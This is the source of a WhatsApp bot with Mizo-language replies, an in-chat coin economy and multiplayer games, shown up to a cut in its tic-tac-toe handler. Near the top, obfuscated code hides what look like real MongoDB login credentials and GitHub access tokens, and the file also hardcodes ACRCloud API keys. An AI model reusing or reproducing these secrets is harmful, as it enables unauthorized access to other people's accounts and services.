require('./settings.js')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@adiwajshing/baileys')
const cfAI = require('./lib/cfAi')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const simpleGit = require('simple-git');
const uploadImage = require('./lib/uploadImage')
const { fromBuffer } = require('file-type');
const uploader = require('./lib/uploadFile');
const SaveTube = require('./lib/savetube');
const amdl = require('./lib/amdl');
//const { xminus } = require('./lib/xminus');
const { youtube } = require('btch-downloader')

const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')

const { tobebot, conns} = require('./tobebot.js')
function _0x2399(_0x3153b1,_0x199d54){const _0x174085=_0x26be();return _0x2399=function(_0x107085,_0x31d2c0){_0x107085=_0x107085-(0x5d5+-0xbe8+-0x6c5*-0x1);let _0x376036=_0x174085[_0x107085];return _0x376036;},_0x2399(_0x3153b1,_0x199d54);}const _0x5b2f9e=_0x2399;function _0x26be(){const _0x153e90=['fMcjNxDG5T','183852KWBvBG','=true&w=ma','2288925EHzNkd','sp2dTwm0t1','Name=hbwab','48iEZuhL','FPIW6ZYWJE','f9H','5193buprGl','5121VJaleH','ZWZAMagPs1','Jok_VkDMtc','tTqVFZDEXQ','12691dOBjaO','0wu9xyfDh2','894iYZWVV','etryWrites','1384HmYjQS','t@hbwabot.','elheniZmAm','0WJBMz1HcE','12902549HKIINb','o7G','ihv6VOamLJ','10nwqESm','_11AZ6NVMA','discord-mo','H74JGI4ZXC','tbvs4.mong','odb.net/?r','ngoose-eco','github_pat','mongodb+sr','s3UO789cHS','jority&app','1789948ifFfOV','QCv_1HN7fn','J9ZfiOaOc3','oinandlimi','nomy','connect','v://Vawk:c','mongoose'];_0x26be=function(){return _0x153e90;};return _0x26be();}(function(_0x3307f5,_0x822910){const _0x5899f9=_0x2399,_0x490678=_0x3307f5();while(!![]){try{const _0x20222a=parseInt(_0x5899f9(0xc4))/(-0x192e+-0x1862+0x3191)+-parseInt(_0x5899f9(0xbb))/(0x1274*-0x2+0x325+0x21c5)+parseInt(_0x5899f9(0xcd))/(-0x239c+0xc9b+-0xb82*-0x2)*(parseInt(_0x5899f9(0xc9))/(-0xc03+0x19b+0xa6c))+parseInt(_0x5899f9(0xc6))/(-0x14e8+-0x953*-0x1+0x6e*0x1b)+-parseInt(_0x5899f9(0xd3))/(0x8a8+0x1960+-0x2202)*(parseInt(_0x5899f9(0xd1))/(0xcc5*-0x1+0x136a+0x69e*-0x1))+parseInt(_0x5899f9(0xd5))/(-0x1fb4*-0x1+0x4*0x14f+-0x2*0x1274)*(-parseInt(_0x5899f9(0xcc))/(0x11ed*0x2+-0x14b4+-0x1*0xf1d))+parseInt(_0x5899f9(0xdc))/(-0xf00+-0x1b41+0x2a4b)*(parseInt(_0x5899f9(0xd9))/(-0x1457*-0x1+0x1deb+-0x3237));if(_0x20222a===_0x822910)break;else _0x490678['push'](_0x490678['shift']());}catch(_0x73a36b){_0x490678['push'](_0x490678['shift']());}}}(_0x26be,0x288b*0x45+-0x1*-0xbf803+-0xe3256*0x1));const ty=_0x5b2f9e(0xb8)+_0x5b2f9e(0xc1)+_0x5b2f9e(0xbe)+_0x5b2f9e(0xd6)+_0x5b2f9e(0xb4)+_0x5b2f9e(0xb5)+_0x5b2f9e(0xd4)+_0x5b2f9e(0xc5)+_0x5b2f9e(0xba)+_0x5b2f9e(0xc8)+'ot',eco=require(_0x5b2f9e(0xb2)+_0x5b2f9e(0xb6)+_0x5b2f9e(0xbf));eco[_0x5b2f9e(0xc0)](ty);let wcvip=_0x5b2f9e(0xb7)+_0x5b2f9e(0xdd)+_0x5b2f9e(0xd2)+_0x5b2f9e(0xbc)+_0x5b2f9e(0xb9)+_0x5b2f9e(0xc7)+_0x5b2f9e(0xd7)+_0x5b2f9e(0xd0)+_0x5b2f9e(0xce)+_0x5b2f9e(0xda),wcvip2=_0x5b2f9e(0xb7)+_0x5b2f9e(0xdd)+_0x5b2f9e(0xd8)+_0x5b2f9e(0xcf)+_0x5b2f9e(0xbd)+_0x5b2f9e(0xc3)+_0x5b2f9e(0xdb)+_0x5b2f9e(0xb3)+_0x5b2f9e(0xca)+_0x5b2f9e(0xcb);const mongoose=require(_0x5b2f9e(0xc2));mongoose[_0x5b2f9e(0xc0)](ty);
const darkarr = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const nizat1 = moment.tz('Asia/Kolkata').format('DD')
const thlazat1 = moment.tz('Asia/Kolkata').format('MM')
const thlazat2 = moment.tz('Asia/Kolkata').format('MMMM')
const kumtin = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const kumzat1 = moment.tz('Asia/Kolkata').format('YYYY')
const nizatani = moment.tz('Asia/Kolkata').format('dddd')
const darkarr2 = moment().tz('Asia/Kolkata').format('hh:mm A [GMT]Z', true)
const acrcloud = require('acrcloud')
const acr = new acrcloud({
  host: "identify-eu-west-1.acrcloud.com",
  access_key: "4dcedd3dc6d911b38c988b872afa7e0d",
  access_secret: "U0PEUg2y6yGVh6NwJra2fJkiE1R5sCfiT6COLXuk",
})
/*const Canvas = require('canvas')
const canvasGif = require('canvas-gif')
*/
const mizo_tawnga_translate_na = require("@kreisler/js-google-translate-free")
const asource1 = 'en'
const atarget1 = 'lus'
const athulo1 = `${nizatani}`
//cooldone
let lastUsed = 0;

//media
const VoiceNoteHerbert = JSON.parse(fs.readFileSync('./asset/database/herbertvn.json'))
const StickerHerbert = JSON.parse(fs.readFileSync('./asset/database/herbertsticker.json'))
const ImageHerbert = JSON.parse(fs.readFileSync('./asset/database/herbertimage.json'))
const VideoHerbert = JSON.parse(fs.readFileSync('./asset/database/herbertvideo.json'))
const BadHerbert = JSON.parse(fs.readFileSync('./asset/database/bad.json'))
let ntrssfeed = JSON.parse(fs.readFileSync('./asset/database/rssfeed.json'))
global.db = JSON.parse(fs.readFileSync('./asset/database/database.json'))
if (global.db) {
  global.db = {
    sticker: {},
    database: {}, 
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...global.db
  };
}
//virtual database\\
let _hmanzat = db.game.hmanzat = []
let _mizoquiz = db.game.mizoquiz = []
let _gkmizo = db.game.gkmizo = []
let thlalakquiz = db.game.thlalakquiz = []
let _biblequiz = db.game.biblequiz = []
let _magicpick = db.game.magicpick = []
let _magicpick_box = db.game.magicpick_box = []
let vote = db.others.vote = []


const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = HBWABotMz = async (HBWABotMz, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        const body = 
        (m.mtype === 'conversation' && m.message?.conversation) ||
        (m.mtype === 'imageMessage' && m.message?.imageMessage?.caption) ||
        (m.mtype === 'videoMessage' && m.message?.videoMessage?.caption) ||
        (m.mtype === 'extendedTextMessage' && m.message?.extendedTextMessage?.text) ||
        (m.mtype === 'buttonsResponseMessage' && m.message?.buttonsResponseMessage?.selectedButtonId) ||
        (m.mtype === 'listResponseMessage' && m.message?.listResponseMessage?.singleSelectReply?.selectedRowId) ||
        (m.mtype === 'interactiveResponseMessage' && 
        JSON.parse(m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '{}')?.id) ||
        (m.mtype === 'templateButtonReplyMessage' && m.message?.templateButtonReplyMessage?.selectedId) ||
        (m.mtype === 'messageContextInfo' && m.message?.listResponseMessage?.singleSelectReply?.selectedRowId) ||
        (m.mtype === 'ephemeralMessage' && m.message?.ephemeralMessage?.message?.extendedTextMessage?.text) ||
        (m.mtype === 'protocolMessage' && '[Deleted Message]') ||
        "";
        if (!body) return; 
        const platform = HBWABotMz.authState.creds.platform;
        const isBusiness = platform === "smba";
        const isMessenger = platform === "andriod"; 
        var budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.charAt(0) : prefixc;
        const isCmd = body.startsWith(prefix);
        const isCmd21 = body.startsWith("/");
        const bruhh = "";
        const isZawhna = body.startsWith(bruhh);
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await HBWABotMz.decodeJid(HBWABotMz.user.id)
        const sender = m.sender
        const senderNumber = sender.split('@')[0]
        const isBot = botNumber.includes(sender)
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const hellomisc = (m.quoted || m)
        const quoted = (hellomisc.mtype == 'buttonsMessage') ? hellomisc[Object.keys(hellomisc)[1]] : (hellomisc.mtype == 'templateMessage') ? hellomisc.hydratedTemplate[Object.keys(hellomisc.hydratedTemplate)[1]] : (hellomisc.mtype == 'product') ? hellomisc[Object.keys(hellomisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : prefix
        const hellobody = body.startsWith(pric)
        const isCommand = hellobody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await HBWABotMz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const banUser = await HBWABotMz.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const HerbertTheCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const HerbertTheDeveloper = m.sender == botNumber ? true : false
        const HerbertTheCreator2 = global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        if (m.isBaileys) return
        if (m.key?.id?.length === 16) return
        //theme audio reply
const Menu = () => {
let Menu = fs.readFileSync('./asset/audio/Menu.mp3')
HBWABotMz.sendMessage(from, { audio: Menu, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
const Owner = () => {
let Owner = fs.readFileSync('./asset/audio/owner.mp3')
HBWABotMz.sendMessage(from, { audio: Owner, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
// react message
 const uploadreact = () => {
 HBWABotMz.sendMessage(from, { react: { text: "⬆️" , key: m.key }}) 
 }
 const loadingreact = () => {
 HBWABotMz.sendMessage(from, { react: { text: "♻️" , key: m.key }}) 
 }
const finishreact = () => {
 HBWABotMz.sendMessage(from, { react: { text: "✅" , key: m.key }}) 
 } 
 const makerreact = () => {
 HBWABotMz.sendMessage(from, { react: { text: "🎯" , key: m.key }}) 
 } 
 const downloadreact = () => {
 HBWABotMz.sendMessage(from, { react: { text: "⬇️" , key: m.key }}) 
 }
 const robotreact = () => {
 HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
 } 
 const helloreact = () => {
 HBWABotMz.sendMessage(from, { react: { text: "👋️" , key: m.key }}) 
 }
 if (!HBWABotMz.public) {
 if (!HerbertTheCreator && !m.key.fromMe) return
 }
 if (autoread) {
HBWABotMz.readMessages([m.key])
}

HBWABotMz.sendPresenceUpdate('unavailable', from)
/*
if (from === 'status@broadcast') {
        await HBWABotMz.sendMessage(from, {
            react: { text: '😍', key: m.key }
        }, { statusJidList: [...m.key.participant, botNumber] });
}
*/
async function getUserTitle(userId) {
    const titlec = "title";
    const balanceData = await eco.balance(userId, titlec);

    if (!balanceData || typeof balanceData.wallet !== "number") {
        return "Fresher"; // Default title if balance is missing or invalid
    }

    const balance = balanceData.wallet;

    const titles = [
        { name: "Fresher", maxBalance: 9999 },
        { name: "Elite", minBalance: 10000, maxBalance: 149999 },
        { name: "Master", minBalance: 150000, maxBalance: 349999 },
        { name: "Grand-Master", minBalance: 350000, maxBalance: 649999 },
        { name: "Epic", minBalance: 650000, maxBalance: 1099999 },
        { name: "Lord", minBalance: 1100000, maxBalance: 1699999 },
        { name: "Mythical", minBalance: 1700000 }
    ];

    const starThresholds = [0, 0.25, 0.5, 0.75, 1];
    let userTitle = "Fresher";
    let stars = "";

    for (const title of titles) {
        if (
            (title.minBalance === undefined || balance >= title.minBalance) &&
            (title.maxBalance === undefined || balance <= title.maxBalance)
        ) {
            userTitle = title.name;

            if (userTitle !== "Fresher" && title.minBalance !== undefined && title.maxBalance !== undefined) {
                const progress = (balance - title.minBalance) / (title.maxBalance - title.minBalance);
                const starCount = starThresholds.filter(threshold => progress >= threshold).length - 1;
                stars = "⭐".repeat(starCount);
            } else if (userTitle === "Mythical") {
                stars = "⭐⭐⭐⭐";
            }
        }
    }

    return `${userTitle} ${stars}`.trim();
}
        //script replier
    async function sendHBWABotMzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await HBWABotMz.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
const mtldata = `https://raw.githubusercontent.com/HBMods-OFC/Vawk/refs/heads/master/Language/${global.bot_language}.json`;
  const mtl1 = await fetch(mtldata)
  const mtl2 = await mtl1.json()
const dodoi2 = async (teks) => {
   HBWABotMz.sendMessage(m.chat, { text: teks}, { quoted: m});
    }
const dodoi = async (teks) => {
    var siamthattur = `${teks
        .replace(/He featurs hi hman i duh chuan 🪙50 i neih a ngai!!./g, 'babawkza1')
        .replace(/Ai nen a in biakna Tiang hian i hmang ang/g, 'babawkza5')
        .replace(/Bot rawn hmang thar tur i nih chuan Claim tiin type rawh, ti chuan bot hman theihna tur 🪙500 i dawng ang, emaw i thiante in thawn tir rawh/g, 'babawkza2')
        .replace(/He features hi VIP ni lo tan Nilaini leh Inrinni ah chauh hman thei a ni, VIP 👑 member nih i duh ve chuan a hnuaia number ka dah hian va dil rawh/g, 'babawkza3')
        .replace(/Kha tiang ringawt loh khan/g, 'babawkza4')}`;

    var bawng1 = 'lus';
    var bawng2 = 'en';
    var bawng3 = siamthattur;
    var vawk4 = await mizo_tawnga_translate_na.translate(bawng1, bawng2, bawng3);
    var vawk5 = `${vawk4}`;
    var bawng5 = 'en';
    var bawng6 = `${bot_language}`;
    var bawng7 = `${vawk5
        .replace(/babawkza1/g, 'You need to have 🪙50 coins for using this feature')
        .replace(/babawkza5/g, 'Chat with Ai, this should be used')
        .replace(/babawkza2/g, 'Please send me *claim* and you can claim 500 coins for daily')
        .replace(/babawkza3/g, 'This feature is non vip can use in only Wednesday and Saturday\nIf you want to become VIP member ask me how to become vip member using Ai feature\n')
        .replace(/babawkza4/g, 'Not only like that')}`;
    var bawng8 = await mizo_tawnga_translate_na.translate(bawng5, bawng6, bawng7);
    var bawng9 = `${bawng8}`;
   
   if (global.default_language) {
            await HBWABotMz.sendMessage(m.chat, { text: teks}, { quoted: m});
    } else {
         if (global.mtl_language) {
        await HBWABotMz.sendMessage(m.chat, { text: bawng9}, { quoted: m});
    }
}
}
const replymizobiblequotes = (teks) => {
 HBWABotMz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `Mizo Bible Quotes`,"body": `HBWABot`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./asset/image/MizoBibleQ.png`),"sourceUrl": `https://instagram.com/mizo_bible_quote`}}}, { quoted: m})
}
    
function removeFile(FilePath){
    if(!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true })
 };
 
const FormData = require('form-data');  
/*
async function tourlup(filePath) {
    const formData = new FormData();
    formData.append('file', fs.createReadStream(filePath));    
    try {
        const response = await fetch('https://api.tioo.eu.org/api/upload.php', {
            method: 'POST',
            body: formData,
        });
        const result = await response.json();       
        if (result.status) {
            return result.result.url;
        } else { 
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
           bodyForm.append("file", buffer, "file." + ext);
        let res = await fetch("https://8030.us.kg/api/upload.php", {
           method: "post",
           body: bodyForm,
                });
        let data = await res.json();
        let resultUrl = data.result ? data.result.url : '';
        return resultUrl;
        }

    } catch (error) {
        console.error("Error: ", error.message);
    }
}

const api8030 = async (buffer) => {
    let { ext } = await fromBuffer(buffer);
    let bodyForm = new FormData();
    bodyForm.append("file", buffer, "file." + ext);
    let res = await fetch("https://8030.us.kg/api/upload.php", {
        method: "post",
        body: bodyForm,
    });
    let data = await res.json();
    let resultUrl = data.result ? data.result.url : '';
    return resultUrl;
}
*/
const replyhbvip = (teks,bet,lonuirawh) => {
 HBWABotMz.sendMessage(m.chat,{ text: teks,contextInfo:{
mentionedJid:[bet],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `Fun Game`,
"body": `Checker👀😂`,
"thumbnailUrl": ``,
"thumbnail": lonuirawh,
"sourceUrl": `https://youtube.com/@HBMods_Channel`}}},
{ quoted: m})
 }
//total features
const hbwabotfeature = () =>{
            var mytext = fs.readFileSync("./HBWABot-Mz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'thawn' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await HBWABotMz.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        HBWABotMz.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
       //autoreply
for (let HBert of VoiceNoteHerbert) {
if (budy === HBert) {
let audiobuffy = fs.readFileSync(`./asset/audio/${HBert}.mp3`)
HBWABotMz.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m }) 
}
}
for (let HBert of StickerHerbert){
if (budy === HBert){
let stickerbuffy = fs.readFileSync(`./asset/sticker/${HBert}.webp`)
HBWABotMz.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let HBert of ImageHerbert){
if (budy === HBert){
let imagebuffy = fs.readFileSync(`./asset/image/${HBert}.jpg`)
HBWABotMz.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let HBert of VideoHerbert){
if (budy === HBert){
let videobuffy = fs.readFileSync(`./asset/video/${HBert}.mp4`)
HBWABotMz.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}


// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: HBWABotMz.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, HBWABotMz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
HBWABotMz.ev.emit('messages.upsert', msg)
}

//============= [LIST MESSAGE CHECK ]================
        if(m.mtype === "interactiveResponseMessage"){
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } ,  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return HBWABotMz.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//=============================
 //Suit RPS
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
HBWABotMz.sendTextWithMentions(m.chat, `@${roof.p.split`@`[0]}, @${roof.p2.split`@`[0]}'n a cho lo che a, chu vangin cancel a ni`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
HBWABotMz.sendText(m.chat, `R P S chu in thlan turin pvt a thawn ve ve in ni!..

@${roof.p.split`@`[0]} leh 
@${roof.p2.split`@`[0]}

He mi link hi hmet la RPS a i duh ber kha lo thlang rawh
 https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) HBWABotMz.sendText(roof.p, `I duh ber thlang rawh \n\Rock🗿\nPaper📄\nScissors✂️`, m)
if (!roof.pilih2) HBWABotMz.sendText(roof.p2, `I duh ber thlang rawh \n\nRock🗿\nPaper📄\nScissors✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) HBWABotMz.sendText(m.chat, `In pahnihin in khel tum loh ve ve vangin RPS chu cancel a ni`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
HBWABotMz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]}'n hun tiam chhunga a thlan hman loh avangin, Game Over a ni!`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /scissors/i
let b = /rock/i
let k = /paper/i
let reg = /^(scissors|rock|paper)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
dodoi(` ${m.text} i thlang e✓ ${!roof.pilih2 ? `\n\nI tumpui la nghak lawk ang` : ''}`)
if (!roof.pilih2) HBWABotMz.sendText(roof.p2, '_Lehlamin a thlang tawh a_\nTunah nang i thlan hun', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
dodoi(`${m.text} i thlang e✓ ${!roof.pilih ? `\n\nI tumpui la nghak lawk ang` : ''}`)
if (!roof.pilih) HBWABotMz.sendText(roof.p, '_Lehlamin a thlang tawh a_\nTunah nang i thlan hun', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
HBWABotMz.sendText(roof.asal, `_*RPS Results*_${tie ? '\nIn in hneh tawk chiah' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` A chak zawk\n` : ` A chaklo zawk\n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` A chak zawk \n` : ` A chaklo zawk\n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
} //end
if (this.bfs) {
  let game = Object.values(this.bfs).find(g => g.id && g.status && [g.p1, g.p2].includes(m.sender));
  if (game) {
    if (m.sender === game.p2 && /^(accept|acc|yes|okay)/i.test(m.text) && game.status === 'wait') {
      game.status = 'play';
      clearTimeout(game.waktu);
      HBWABotMz.sendText(m.chat, `Game start a ni!\n@${game.p1.split('@')[0]} (HP: 200)\n@${game.p2.split('@')[0]} (HP: 200)`, m, { mentions: [game.p1, game.p2] });
      HBWABotMz.sendText(game.p1, `I spell hman tur thlang rawh le\n1. Fire (30)\n2. Ice (20)\n3. Lightning (50)\n4. Shadow (10)`, m);
      HBWABotMz.sendText(game.p2, `I spell hman tur thlang rawh le\n1. Fire (30)\n2. Ice (20)\n3. Lightning (50)\n4. Shadow (10)`, m);
      return;
    }

    if (game.status === 'play') {
      let playerKey = m.sender === game.p1 ? 'p1' : m.sender === game.p2 ? 'p2' : null;
      if (!playerKey) return;

      if (game[`${playerKey}spell`]) return;
      if (!['1', '2', '3', '4'].includes(m.text.trim())) return;

      let spell = m.text.trim();
      game[`${playerKey}spell`] = spell;

      if (game.p1spell && game.p2spell) {
        let dmg = { '1': 30, '2': 20, '3': 50, '4': 10 };
        game.hp2 -= dmg[game.p1spell];
        game.hp1 -= dmg[game.p2spell];

        if (game.hp1 <= 0 && game.hp2 <= 0) {
          HBWABotMz.sendText(m.chat, "Draw! Both players lost all HP.");
        } else if (game.hp1 <= 0) {
          await eco.deduct(game.p1, kancoins, 50);
          await eco.give(game.p2, kancoins, 50);
          HBWABotMz.sendText(m.chat, `@${game.p2.split('@')[0]} chu a chak zawk a! +50 coins\n@${game.p1.split('@')[0]} -50 coins`, m, { mentions: [game.p1, game.p2] });
        } else if (game.hp2 <= 0) {
          await eco.deduct(game.p2, kancoins, 50);
          await eco.give(game.p1, kancoins, 50);
          HBWABotMz.sendText(m.chat, `@${game.p1.split('@')[0]} chu a chak zawk a! +50 coins\n@${game.p2.split('@')[0]} -50 coins`, m, { mentions: [game.p1, game.p2] });
        } else {
          HBWABotMz.sendText(m.chat, `@${game.p1.split('@')[0]} HP: ${game.hp1}\n@${game.p2.split('@')[0]} HP: ${game.hp2}`, m, { mentions: [game.p1, game.p2] });
          game.p1spell = null;
          game.p2spell = null;
          return;
        }

        delete this.bfs[game.id];
      }
    }
  }
}


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    dodoi({
	    '-3': 'Game a tawp tawh',
	    '-2': 'dik lo',
	    '-1': 'Position a dik lo',
